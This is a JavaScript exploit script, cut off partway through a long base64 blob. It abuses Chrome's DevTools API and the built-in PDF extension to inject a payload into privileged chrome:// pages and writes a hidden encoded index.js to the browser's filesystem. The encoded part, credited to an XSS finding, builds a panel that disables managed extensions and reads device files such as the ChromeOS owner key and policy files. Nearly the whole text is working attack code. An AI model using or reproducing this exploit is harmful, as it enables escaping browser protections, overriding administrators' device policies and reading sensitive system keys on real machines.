((function () {
    if (!opener) {
        opener = window;
    }
    // alert(origin);

    //     window.w = w;
    // })
    const w = window.opener.open(window.opener.location.origin + window.opener.location.pathname);
    window.opener.close();
    w.addEventListener("load", async () => {
        if (!w.DevToolsAPI) {
            console.log("reloading");
            w.opener = null;
            w.location.reload();
        }
        await sleep(500);
        console.log("Got DevToolsAPI object from opened window:", w.DevToolsAPI);
        exploit(w);
    });

    window.w = w;


    function exploit(w) {


        function ui() {
            const pdfId = "mhjfbmdgcfjbbpaeojofohoefgiehjai";
            var globalUID = 0;
            let globalMap = [];
            function payload_swamp(w, d) {
                const pdfId = "mhjfbmdgcfjbbpaeojofohoefgiehjai"; // Redefinition because we convert this function to a string
                const mojoURL = "chrome://resources/mojo/mojo/public/js/bindings.js";
                console.log('hi');
                if (location.origin.includes("chrome-extension://" + pdfId)) {
                    w.close();
                    chrome.tabs.getCurrent(function (info) {
                        chrome.windows.create({
                            setSelfAsOpener: true,
                            url: mojoURL
                        }, function (win) {
                            const r = win.tabs[0].id;
                            chrome.tabs.executeScript(r, { code: `location.href = \"javascript:${atob('%%CHROMEPAYLOAD%%')}\"` });

                        })
                    })


                    return;
                }
                // console.log(d);
                // w.setTimeout(function() {
                const blob_url = new Blob(["alert(1)"], { type: "text/html" });

                w.webkitRequestFileSystem(TEMPORARY, 2 * 1024 * 1024, async function (fs) {
                    function removeFile(file) {
                        return new Promise(function (resolve, reject) {
                            fs.root.getFile(file, { create: true }, function (entry) {
                                entry.remove(resolve);
                            })
                        });
                    }
                    function writeFile(file, data) {
                        return new Promise((resolve, reject) => {
                            fs.root.getFile(file, { create: true }, function (entry) {
                                entry.remove(function () {
                                    fs.root.getFile(file, { create: true }, function (entry) {
                                        entry.createWriter(function (writer) {
                                            writer.write(new Blob([data]));
                                            resolve(entry.toURL());
                                        })
                                    })
                                })
                            })
                        })
                    };
                    if (d.cleanup) {
                        console.log("cleaning up");
                        debugger;
                        await removeFile('index.js');
                        await removeFile('index.html');
                        alert("Cleaned up successfully!");
                        cleanup();
                        w.close();
                        return;
                    }
                    await writeFile('index.js', atob(`b25lcnJvciA9IGFsZXJ0OwoKY29uc3QgdWlUZW1wbGF0ZSA9IGAKCmA7CgppZiAobG9jYWxTdG9yYWdlLmdldEl0ZW0oInVzZXJkZWZJZHMiKSA9PT0gbnVsbCkKICAgIGxvY2FsU3RvcmFnZS5zZXRJdGVtKCJ1c2VyZGVmSWRzIiwgSlNPTi5zdHJpbmdpZnkoW10pKTsKCkFycmF5LnByb3RvdHlwZS5yZW1vdmUgPSBmdW5jdGlvbihpdGVtKSB7CiAgICBpZiAodGhpcy5pbmRleE9mKGl0ZW0pID09PSAtMSkgdGhyb3cgbmV3IEVycm9yKCJub3QgaW4gYXJyYXkiKTsKICAgIHRoaXMuc3BsaWNlKHRoaXMuaW5kZXhPZihpdGVtKSwgMSk7Cn07CgpmdW5jdGlvbiBtYWtlVG9hc3QobXNnLCB0aW1lKSB7CiAgICBjb25zdCBwb3BvdmVyID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiYXJ0aWNsZSIpOwogICAgcG9wb3Zlci5wb3BvdmVyID0gIm1hbnVhbCI7CiAgICBwb3BvdmVyLmNsYXNzTGlzdC5hZGQoInRvYXN0Iik7CiAgICBwb3BvdmVyLmNsYXNzTGlzdC5hZGQoIm5ld2VzdCIpOwogICAgcG9wb3Zlci50ZXh0Q29udGVudCA9IG1zZzsKICAgIHBvcG92ZXIuc3R5bGUudHJhbnNsYXRlID0gIi01MCUiOwoKICAgIGRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQocG9wb3Zlcik7CiAgICBwb3BvdmVyLnNob3dQb3BvdmVyKCk7CgogICAgc2V0VGltZW91dCgoKSA9PiB7CiAgICAgICAgcG9wb3Zlci5oaWRlUG9wb3ZlcigpOwogICAgICAgIHNldFRpbWVvdXQoKCkgPT4gewogICAgICAgICAgICBwb3BvdmVyLnJlbW92ZSgpOwogICAgICAgIH0sIDUwMCk7CiAgICB9LCB0aW1lICogMTAwMCk7CgogICAgcG9wb3Zlci5hZGRFdmVudExpc3RlbmVyKCJ0b2dnbGUiLCAoZXZlbnQpID0+IHsKICAgICAgICBpZiAoZXZlbnQubmV3U3RhdGUgPT09ICJvcGVuIikgewogICAgICAgICAgICBtb3ZlVG9hc3RzKCk7CiAgICAgICAgfQogICAgfSk7Cn0KCmZ1bmN0aW9uIG1vdmVUb2FzdHMoKSB7CiAgICBjb25zdCB0b2FzdHMgPSBkb2N1bWVudC5xdWVyeVNlbGVjdG9yQWxsKCIudG9hc3QiKTsKCiAgICB0b2FzdHMuZm9yRWFjaCgodG9hc3QpID0+IHsKICAgICAgICBpZiAodG9hc3QuY2xhc3NMaXN0LmNvbnRhaW5zKCJuZXdlc3QiKSkgewogICAgICAgICAgICB0b2FzdC5zdHlsZS50b3AgPSBgNXB4YDsKICAgICAgICAgICAgdG9hc3QuY2xhc3NMaXN0LnJlbW92ZSgibmV3ZXN0Iik7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgY29uc3QgcHJldlZhbHVlID0gdG9hc3Quc3R5bGUudG9wLnJlcGxhY2UoInB4IiwgIiIpOwogICAgICAgICAgICBjb25zdCBuZXdWYWx1ZSA9IHBhcnNlSW50KHByZXZWYWx1ZSkgKyB0b2FzdC5jbGllbnRIZWlnaHQgKyAxMDsKICAgICAgICAgICAgdG9hc3Quc3R5bGUudG9wID0gYCR7bmV3VmFsdWV9cHhgOwogICAgICAgIH0KICAgIH0pOwp9CgpmdW5jdGlvbiBtYWtlRGlhbG9nKHRpdGxlLCBtc2csIG9uY2FuY2VsLCBvbmNvbmZpcm0pIHsKICAgIGNvbnN0IGRpYWxvZyA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImRpYWxvZyIpOwogICAgY29uc3QgY29uZmlybUJ0biA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImJ1dHRvbiIpOwogICAgY29uc3QgY2FuY2VsQnRuID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiYnV0dG9uIik7CiAgICBjb25zdCBoZWFkID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiaDEiKTsKICAgIGNvbnN0IGJvZHkgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJkaXYiKTsKICAgIGNvbnN0IGZvb3QgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJkaXYiKTsKCiAgICBkaWFsb2cuYXBwZW5kQ2hpbGQoaGVhZCk7CiAgICBkaWFsb2cuYXBwZW5kQ2hpbGQoYm9keSk7CiAgICBkaWFsb2cuYXBwZW5kQ2hpbGQoZm9vdCk7CiAgICBmb290LmFwcGVuZENoaWxkKGNvbmZpcm1CdG4pOwogICAgZm9vdC5hcHBlbmRDaGlsZChjYW5jZWxCdG4pOwogICAgZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChkaWFsb2cpOwoKICAgIGhlYWQudGV4dENvbnRlbnQgPSB0aXRsZTsKCiAgICBib2R5LnN0eWxlLm92ZXJmbG93WSA9ICJzY3JvbGwiOwogICAgYm9keS5zdHlsZS5jb2xvciA9ICJyZ2IoMjIwIDIyMCAyMjApIjsKICAgIGJvZHkuc3R5bGUuZm9udFNpemUgPSAiMXJlbSI7CiAgICBib2R5LnN0eWxlLmJvcmRlclJhZGl1cyA9ICIxMHB4IjsKICAgIGJvZHkuc3R5bGUucGFkZGluZyA9ICIxMHB4IjsKICAgIGJvZHkuc3R5bGUubWFyZ2luQm90dG9tID0gIjEwcHgiOwoKICAgIGlmIChBcnJheS5pc0FycmF5KG1zZykpIHsKICAgICAgICBib2R5LnN0eWxlLmJvcmRlciA9ICJzb2xpZCAxcHggIzFkMWQxZCI7CiAgICAgICAgbXNnLmZvckVhY2goKHZhbHVlKSA9PiB7CiAgICAgICAgICAgIGxldCBpdGVtID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgicCIpOwogICAgICAgICAgICBpdGVtLnRleHRDb250ZW50ID0gdmFsdWU7CiAgICAgICAgICAgIGJvZHkuYXBwZW5kQ2hpbGQoaXRlbSk7CiAgICAgICAgfSk7CiAgICB9IGVsc2UgewogICAgICAgIGJvZHkuc3R5bGUuYm9yZGVyID0gInNvbGlkIDFweCAjMmQyZDJkIjsKICAgICAgICBib2R5LnRleHRDb250ZW50ID0gbXNnOwogICAgfQoKICAgIGZvb3Quc3R5bGUuaGVpZ2h0ID0gImZpdC1jb250ZW50IjsKICAgIGZvb3Quc3R5bGUubWFyZ2luVG9wID0gImF1dG8iOwogICAgZm9vdC5zdHlsZS5kaXNwbGF5ID0gImZsZXgiOwogICAgZm9vdC5zdHlsZS5mbGV4RGlyZWN0aW9uID0gInJvdy1yZXZlcnNlIjsKCiAgICBjb25maXJtQnRuLmNsYXNzTGlzdC5hZGQoImNvbmZpcm1CdG4iKTsKICAgIGNvbmZpcm1CdG4uYWRkRXZlbnRMaXN0ZW5lcigiY2xpY2siLCAoKSA9PiB7CiAgICAgICAgZGlhbG9nLmNsb3NlKCk7CiAgICAgICAgb25jb25maXJtKCk7CiAgICAgICAgc2V0VGltZW91dCgoKSA9PiBkaWFsb2cucmVtb3ZlKCksIDEwMDApOwogICAgfSk7CiAgICBjb25maXJtQnRuLnRleHRDb250ZW50ID0gIkNvbmZpcm0iOwoKICAgIGNhbmNlbEJ0bi5jbGFzc0xpc3QuYWRkKCJjYW5jZWxCdG4iKTsKICAgIGNhbmNlbEJ0bi5hZGRFdmVudExpc3RlbmVyKCJjbGljayIsICgpID0+IHsKICAgICAgICBkaWFsb2cuY2xvc2UoKTsKICAgICAgICBvbmNhbmNlbCgpOwogICAgICAgIHNldFRpbWVvdXQoKCkgPT4gZGlhbG9nLnJlbW92ZSgpLCAxMDAwKTsKICAgIH0pOwogICAgY2FuY2VsQnRuLnRleHRDb250ZW50ID0gIkNhbmNlbCI7CgogICAgZGlhbG9nLnNob3dNb2RhbCgpOwp9Cgphc3luYyBmdW5jdGlvbiBleHRlbnNpb25FeGlzdHMoaWQpIHsKICAgIHJldHVybiBuZXcgUHJvbWlzZSgocmVzb2x2ZSkgPT4KICAgICAgICBjaHJvbWUubWFuYWdlbWVudC5nZXRBbGwoKGV4dGVuc2lvbnMpID0+CiAgICAgICAgICAgIHJlc29sdmUoZXh0ZW5zaW9ucy5zb21lKChleHQpID0+IGV4dC5pZCA9PT0gaWQpKQogICAgICAgICkKICAgICk7Cn0KCmNvbnN0IG1hbmFnZW1lbnRUZW1wbGF0ZSA9IGAKPHRpdGxlPlVudGl0bGVkIGRvY3VtZW50PC90aXRsZT4KPGxpbmsgcmVsPSJpY29uIiB0eXBlPSJpbWFnZS94LWljb24iIGhyZWY9Imh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9jcm9zc2pibHkvSGFyVG9vbHMvcmVmcy9oZWFkcy9tYWluL2RvY3MuaWNvIj4KPGRpdiBpZD0iY2hyb21lX21hbmFnZW1lbnRfZGlzYWJsZV9leHQiPgogIDxkaXYgY2xhc3M9ImhlYWRlciI+CiAgICA8aW1nIHNyYz0iaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Nyb3NzamJseS9IYXJUb29scy9yZWZzL2hlYWRzL21haW4vaGFydG9vbHMuZ2lmIiBhbHQ9IkhhclRvb2xzIExvZ28iIGNsYXNzPSJsb2dvIiAvPgogICAgPGgxPiBjaHJvbWUubWFuYWdlbWVudCBEaXNhYmxlIEV4dGVuc2lvbnMgPC9oMT48YnI+CiAgICA8c3BhbiBpZD0iZXh0ZW5zaW9uLWluZm8iPjwvc3Bhbj4KICA8L2Rpdj4KICA8cCBjbGFzcz0iZGVzY3JpcHRpb24iPkdpdEh1YiByZXBvOiBodHRwczovL2dpdGh1Yi5jb20vY3Jvc3NqYmx5L0hhclRvb2xzLyA8YnI+IFhTUyBmb3VuZCBieSA8YSBocmVmPSJodHRwczovL2Nyb3NzamJseS5wYWdlcy5kZXYvIj5jcm9zc2pibHk8L2E+IDxicj4gVUkgbWFkZSBieSA8YSBocmVmPSJodHRwczovL2dpdGh1Yi5jb20vQmxvYmJ5LUJvaS8iPkJsb2JieSBCb2k8L2E+PGJyPjwvcD48aHI+CiAgPHdoaXRlYnV0dG9ucz4KICA8YnV0dG9uIGlkPSJjdXJyZW50LWV4dGVuc2lvbiI+RGlzYWJsZSBpbmplY3RlZCBleHRlbnNpb248L2J1dHRvbj4KICA8YnV0dG9uIGlkPSJybXYtY21uLWJsdCI+UmVtb3ZlIEJsb2F0PC9idXR0b24+CiAgPGJ1dHRvbiBpZD0iZGlzYWJsZS11c2VyZGVmLWV4dHMiPkRpc2FibGUgdXNlciBkZWZpbmVkIGxpc3Qgb2YgZXh0ZW5zaW9uczwvYnV0dG9uPgogIDwvd2hpdGVidXR0b25zPgoJPGhyPgogIDxiciAvPjxiciAvPgogIDx1bCBjbGFzcz0iZXh0bGlzdCI+CiAgPC91bD4KCiAgPGRpdiBzdHlsZT0iaGVpZ2h0OiA1MHB4Ij48L2Rpdj4KPC9kaXY+CgpgOwpsZXQgc2F2ZWRFeHRMaXN0ID0gW107CmNvbnN0IGtGaWxlcyA9IFsKICAgICIvdmFyL2xpYi9kZXZpY2VzZXR0aW5ncy9vd25lci5rZXkiLAogICAgIi9ob21lL2Nocm9ub3MvTG9jYWwgU3RhdGUiCl0KYXN5bmMgZnVuY3Rpb24gcmVhZEZpbGUocGF0aCkgewogICAgcmV0dXJuIChhd2FpdCBmZXRjaCgiZmlsZTovLyIgKyBwYXRoKSkuYXJyYXlCdWZmZXIoKTsKfQphc3luYyBmdW5jdGlvbiBmaW5kTGFzdFBvbGljeUZpbGUoKSB7CiAgICBjb25zdCBrRGV2aWNlUG9saWN5ID0gIi92YXIvbGliL2RldmljZXNldHRpbmdzL3BvbGljeS4iOwogICAgbGV0IGZvdW5kU29tZXRoaW5nID0gZmFsc2U7CiAgICBsZXQgaSA9IDA7CiAgICB3aGlsZSAodHJ1ZSkgewogICAgICAgIHRyeSB7CiAgICAgICAgICAgIGNvbnNvbGUubG9nKCJUcnlpbmcgIiArIGtEZXZpY2VQb2xpY3kgKyBpKTsKICAgICAgICAgICAgYXdhaXQgcmVhZEZpbGUoa0RldmljZVBvbGljeSArIGkpOwogICAgICAgICAgICBmb3VuZFNvbWV0aGluZyA9IHRydWU7CiAgICAgICAgfSBjYXRjaCB7CiAgICAgICAgICAgIGlmIChmb3VuZFNvbWV0aGluZykgewogICAgICAgICAgICAgICAgcmV0dXJuIGtEZXZpY2VQb2xpY3kgKyAoaSAtIDEpOwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGkrKzsKICAgIH0KfQoKZnVuY3Rpb24gZG9lc05lZWRGaWxlQWNjZXNzKCkgewogICAgY29uc3Qgc2MgPSBjaHJvbWUucnVudGltZS5nZXRNYW5pZmVzdCgpLnBlcm1pc3Npb25zOwogICAgcmV0dXJuIHNjLmluY2x1ZGVzKCJhY3RpdmVUYWIiKSB8fCBzYy5pbmNsdWRlcygiPGFsbF91cmxzPiIpOwp9CgpmdW5jdGlvbiBub3JtYWxpemVTdHJpbmdQb3NpeChwYXRoLCBhbGxvd0Fib3ZlUm9vdCkgewogICAgdmFyIHJlcyA9ICcnOwogICAgdmFyIGxhc3RTZWdtZW50TGVuZ3RoID0gMDsKICAgIHZhciBsYXN0U2xhc2ggPSAtMTsKICAgIHZhciBkb3RzID0gMDsKICAgIHZhciBjb2RlOwogICAgZm9yICh2YXIgaSA9IDA7IGkgPD0gcGF0aC5sZW5ndGg7ICsraSkgewogICAgICAgIGlmIChpIDwgcGF0aC5sZW5ndGgpCiAgICAgICAgICAgIGNvZGUgPSBwYXRoLmNoYXJDb2RlQXQoaSk7CiAgICAgICAgZWxzZSBpZiAoY29kZSA9PT0gNDcpCiAgICAgICAgICAgIGJyZWFrOwogICAgICAgIGVsc2UKICAgICAgICAgICAgY29kZSA9IDQ3OwogICAgICAgIGlmIChjb2RlID09PSA0NykgewogICAgICAgICAgICBpZiAobGFzdFNsYXNoID09PSBpIC0gMSB8fCBkb3RzID09PSAxKSB7CgogICAgICAgICAgICB9IGVsc2UgaWYgKGxhc3RTbGFzaCAhPT0gaSAtIDEgJiYgZG90cyA9PT0gMikgewogICAgICAgICAgICAgICAgaWYgKHJlcy5sZW5ndGggPCAyIHx8IGxhc3RTZWdtZW50TGVuZ3RoICE9PSAyIHx8IHJlcy5jaGFyQ29kZUF0KHJlcy5sZW5ndGggLSAxKSAhPT0gNDYgfHwgcmVzLmNoYXJDb2RlQXQocmVzLmxlbmd0aCAtIDIpICE9PSA0NikgewogICAgICAgICAgICAgICAgICAgIGlmIChyZXMubGVuZ3RoID4gMikgewogICAgICAgICAgICAgICAgICAgICAgICB2YXIgbGFzdFNsYXNoSW5kZXggPSByZXMubGFzdEluZGV4T2YoJy8nKTsKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGxhc3RTbGFzaEluZGV4ICE9PSByZXMubGVuZ3RoIC0gMSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGxhc3RTbGFzaEluZGV4ID09PSAtMSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJlcyA9ICcnOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxhc3RTZWdtZW50TGVuZ3RoID0gMDsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcmVzID0gcmVzLnNsaWNlKDAsIGxhc3RTbGFzaEluZGV4KTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsYXN0U2VnbWVudExlbmd0aCA9IHJlcy5sZW5ndGggLSAxIC0gcmVzLmxhc3RJbmRleE9mKCcvJyk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsYXN0U2xhc2ggPSBpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgZG90cyA9IDA7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb250aW51ZTsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0gZWxzZSBpZiAocmVzLmxlbmd0aCA9PT0gMiB8fCByZXMubGVuZ3RoID09PSAxKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIHJlcyA9ICcnOwogICAgICAgICAgICAgICAgICAgICAgICBsYXN0U2VnbWVudExlbmd0aCA9IDA7CiAgICAgICAgICAgICAgICAgICAgICAgIGxhc3RTbGFzaCA9IGk7CiAgICAgICAgICAgICAgICAgICAgICAgIGRvdHMgPSAwOwogICAgICAgICAgICAgICAgICAgICAgICBjb250aW51ZTsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBpZiAoYWxsb3dBYm92ZVJvb3QpIHsKICAgICAgICAgICAgICAgICAgICBpZiAocmVzLmxlbmd0aCA+IDApCiAgICAgICAgICAgICAgICAgICAgICAgIHJlcyArPSAnLy4uJzsKICAgICAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgICAgIHJlcyA9ICcuLic7CiAgICAgICAgICAgICAgICAgICAgbGFzdFNlZ21lbnRMZW5ndGggPSAyOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgaWYgKHJlcy5sZW5ndGggPiAwKQogICAgICAgICAgICAgICAgICAgIHJlcyArPSAnLycgKyBwYXRoLnNsaWNlKGxhc3RTbGFzaCArIDEsIGkpOwogICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgIHJlcyA9IHBhdGguc2xpY2UobGFzdFNsYXNoICsgMSwgaSk7CiAgICAgICAgICAgICAgICBsYXN0U2VnbWVudExlbmd0aCA9IGkgLSBsYXN0U2xhc2ggLSAxOwogICAgICAgICAgICB9CiAgICAgICAgICAgIGxhc3RTbGFzaCA9IGk7CiAgICAgICAgICAgIGRvdHMgPSAwOwogICAgICAgIH0gZWxzZSBpZiAoY29kZSA9PT0gNDYgJiYgZG90cyAhPT0gLTEpIHsKICAgICAgICAgICAgKytkb3RzOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIGRvdHMgPSAtMTsKICAgICAgICB9CiAgICB9CiAgICByZXR1cm4gcmVzOwp9CgpmdW5jdGlvbiBfZm9ybWF0KHNlcCwgcGF0aE9iamVjdCkgewogICAgdmFyIGRpciA9IHBhdGhPYmplY3QuZGlyIHx8IHBhdGhPYmplY3Qucm9vdDsKICAgIHZhciBiYXNlID0gcGF0aE9iamVjdC5iYXNlIHx8IChwYXRoT2JqZWN0Lm5hbWUgfHwgJycpICsgKHBhdGhPYmplY3QuZXh0IHx8ICcnKTsKICAgIGlmICghZGlyKSB7CiAgICAgICAgcmV0dXJuIGJhc2U7CiAgICB9CiAgICBpZiAoZGlyID09PSBwYXRoT2JqZWN0LnJvb3QpIHsKICAgICAgICByZXR1cm4gZGlyICsgYmFzZTsKICAgIH0KICAgIHJldHVybiBkaXIgKyBzZXAgKyBiYXNlOwp9CnZhciBwb3NpeCA9IHsKCiAgICByZXNvbHZlOiBmdW5jdGlvbiByZXNvbHZlKCkgewogICAgICAgIHZhciByZXNvbHZlZFBhdGggPSAnJzsKICAgICAgICB2YXIgcmVzb2x2ZWRBYnNvbHV0ZSA9IGZhbHNlOwogICAgICAgIHZhciBjd2Q7CiAgICAgICAgZm9yICh2YXIgaSA9IGFyZ3VtZW50cy5sZW5ndGggLSAxOyBpID49IC0xICYmICFyZXNvbHZlZEFic29sdXRlOyBpLS0pIHsKICAgICAgICAgICAgdmFyIHBhdGg7CiAgICAgICAgICAgIGlmIChpID49IDApCiAgICAgICAgICAgICAgICBwYXRoID0gYXJndW1lbnRzW2ldOwogICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgIGlmIChjd2QgPT09IHVuZGVmaW5lZCkKICAgICAgICAgICAgICAgICAgICBjd2QgPSBwcm9jZXNzLmN3ZCgpOwogICAgICAgICAgICAgICAgcGF0aCA9IGN3ZDsKICAgICAgICAgICAgfQogICAgICAgICAgICBhc3NlcnRQYXRoKHBhdGgpOwoKICAgICAgICAgICAgaWYgKHBhdGgubGVuZ3RoID09PSAwKSB7CiAgICAgICAgICAgICAgICBjb250aW51ZTsKICAgICAgICAgICAgfQogICAgICAgICAgICByZXNvbHZlZFBhdGggPSBwYXRoICsgJy8nICsgcmVzb2x2ZWRQYXRoOwogICAgICAgICAgICByZXNvbHZlZEFic29sdXRlID0gcGF0aC5jaGFyQ29kZUF0KDApID09PSA0NzsKICAgICAgICB9CgogICAgICAgIHJlc29sdmVkUGF0aCA9IG5vcm1hbGl6ZVN0cmluZ1Bvc2l4KHJlc29sdmVkUGF0aCwgIXJlc29sdmVkQWJzb2x1dGUpOwogICAgICAgIGlmIChyZXNvbHZlZEFic29sdXRlKSB7CiAgICAgICAgICAgIGlmIChyZXNvbHZlZFBhdGgubGVuZ3RoID4gMCkKICAgICAgICAgICAgICAgIHJldHVybiAnLycgKyByZXNvbHZlZFBhdGg7CiAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgIHJldHVybiAnLyc7CiAgICAgICAgfSBlbHNlIGlmIChyZXNvbHZlZFBhdGgubGVuZ3RoID4gMCkgewogICAgICAgICAgICByZXR1cm4gcmVzb2x2ZWRQYXRoOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIHJldHVybiAnLic7CiAgICAgICAgfQogICAgfSwKICAgIG5vcm1hbGl6ZTogZnVuY3Rpb24gbm9ybWFsaXplKHBhdGgpIHsKICAgICAgICBhc3NlcnRQYXRoKHBhdGgpOwogICAgICAgIGlmIChwYXRoLmxlbmd0aCA9PT0gMCkgcmV0dXJuICcuJzsKICAgICAgICB2YXIgaXNBYnNvbHV0ZSA9IHBhdGguY2hhckNvZGVBdCgwKSA9PT0gNDc7CiAgICAgICAgdmFyIHRyYWlsaW5nU2VwYXJhdG9yID0gcGF0aC5jaGFyQ29kZUF0KHBhdGgubGVuZ3RoIC0gMSkgPT09IDQ3OwoKICAgICAgICBwYXRoID0gbm9ybWFsaXplU3RyaW5nUG9zaXgocGF0aCwgIWlzQWJzb2x1dGUpOwogICAgICAgIGlmIChwYXRoLmxlbmd0aCA9PT0gMCAmJiAhaXNBYnNvbHV0ZSkgcGF0aCA9ICcuJzsKICAgICAgICBpZiAocGF0aC5sZW5ndGggPiAwICYmIHRyYWlsaW5nU2VwYXJhdG9yKSBwYXRoICs9ICcvJzsKICAgICAgICBpZiAoaXNBYnNvbHV0ZSkgcmV0dXJuICcvJyArIHBhdGg7CiAgICAgICAgcmV0dXJuIHBhdGg7CiAgICB9LAogICAgaXNBYnNvbHV0ZTogZnVuY3Rpb24gaXNBYnNvbHV0ZShwYXRoKSB7CiAgICAgICAgYXNzZXJ0UGF0aChwYXRoKTsKICAgICAgICByZXR1cm4gcGF0aC5sZW5ndGggPiAwICYmIHBhdGguY2hhckNvZGVBdCgwKSA9PT0gNDc7CiAgICB9LAogICAgam9pbjogZnVuY3Rpb24gam9pbigpIHsKICAgICAgICBpZiAoYXJndW1lbnRzLmxlbmd0aCA9PT0gMCkKICAgICAgICAgICAgcmV0dXJuICcuJzsKICAgICAgICB2YXIgam9pbmVkOwogICAgICAgIGZvciAodmFyIGkgPSAwOyBpIDwgYXJndW1lbnRzLmxlbmd0aDsgKytpKSB7CiAgICAgICAgICAgIHZhciBhcmcgPSBhcmd1bWVudHNbaV07CiAgICAgICAgICAgIGFzc2VydFBhdGgoYXJnKTsKICAgICAgICAgICAgaWYgKGFyZy5sZW5ndGggPiAwKSB7CiAgICAgICAgICAgICAgICBpZiAoam9pbmVkID09PSB1bmRlZmluZWQpCiAgICAgICAgICAgICAgICAgICAgam9pbmVkID0gYXJnOwogICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgIGpvaW5lZCArPSAnLycgKyBhcmc7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgaWYgKGpvaW5lZCA9PT0gdW5kZWZpbmVkKQogICAgICAgICAgICByZXR1cm4gJy4nOwogICAgICAgIHJldHVybiBwb3NpeC5ub3JtYWxpemUoam9pbmVkKTsKICAgIH0sCiAgICByZWxhdGl2ZTogZnVuY3Rpb24gcmVsYXRpdmUoZnJvbSwgdG8pIHsKICAgICAgICBhc3NlcnRQYXRoKGZyb20pOwogICAgICAgIGFzc2VydFBhdGgodG8pOwogICAgICAgIGlmIChmcm9tID09PSB0bykgcmV0dXJuICcnOwogICAgICAgIGZyb20gPSBwb3NpeC5yZXNvbHZlKGZyb20pOwogICAgICAgIHRvID0gcG9zaXgucmVzb2x2ZSh0byk7CiAgICAgICAgaWYgKGZyb20gPT09IHRvKSByZXR1cm4gJyc7CgogICAgICAgIHZhciBmcm9tU3RhcnQgPSAxOwogICAgICAgIGZvciAoOyBmcm9tU3RhcnQgPCBmcm9tLmxlbmd0aDsgKytmcm9tU3RhcnQpIHsKICAgICAgICAgICAgaWYgKGZyb20uY2hhckNvZGVBdChmcm9tU3RhcnQpICE9PSA0NykKICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgIH0KICAgICAgICB2YXIgZnJvbUVuZCA9IGZyb20ubGVuZ3RoOwogICAgICAgIHZhciBmcm9tTGVuID0gZnJvbUVuZCAtIGZyb21TdGFydDsKCiAgICAgICAgdmFyIHRvU3RhcnQgPSAxOwogICAgICAgIGZvciAoOyB0b1N0YXJ0IDwgdG8ubGVuZ3RoOyArK3RvU3RhcnQpIHsKICAgICAgICAgICAgaWYgKHRvLmNoYXJDb2RlQXQodG9TdGFydCkgIT09IDQ3KQogICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgfQogICAgICAgIHZhciB0b0VuZCA9IHRvLmxlbmd0aDsKICAgICAgICB2YXIgdG9MZW4gPSB0b0VuZCAtIHRvU3RhcnQ7CgogICAgICAgIHZhciBsZW5ndGggPSBmcm9tTGVuIDwgdG9MZW4gPyBmcm9tTGVuIDogdG9MZW47CiAgICAgICAgdmFyIGxhc3RDb21tb25TZXAgPSAtMTsKICAgICAgICB2YXIgaSA9IDA7CiAgICAgICAgZm9yICg7IGkgPD0gbGVuZ3RoOyArK2kpIHsKICAgICAgICAgICAgaWYgKGkgPT09IGxlbmd0aCkgewogICAgICAgICAgICAgICAgaWYgKHRvTGVuID4gbGVuZ3RoKSB7CiAgICAgICAgICAgICAgICAgICAgaWYgKHRvLmNoYXJDb2RlQXQodG9TdGFydCArIGkpID09PSA0NykgewoKICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIHRvLnNsaWNlKHRvU3RhcnQgKyBpICsgMSk7CiAgICAgICAgICAgICAgICAgICAgfSBlbHNlIGlmIChpID09PSAwKSB7CgogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gdG8uc2xpY2UodG9TdGFydCArIGkpOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0gZWxzZSBpZiAoZnJvbUxlbiA+IGxlbmd0aCkgewogICAgICAgICAgICAgICAgICAgIGlmIChmcm9tLmNoYXJDb2RlQXQoZnJvbVN0YXJ0ICsgaSkgPT09IDQ3KSB7CgogICAgICAgICAgICAgICAgICAgICAgICBsYXN0Q29tbW9uU2VwID0gaTsKICAgICAgICAgICAgICAgICAgICB9IGVsc2UgaWYgKGkgPT09IDApIHsKCiAgICAgICAgICAgICAgICAgICAgICAgIGxhc3RDb21tb25TZXAgPSAwOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAg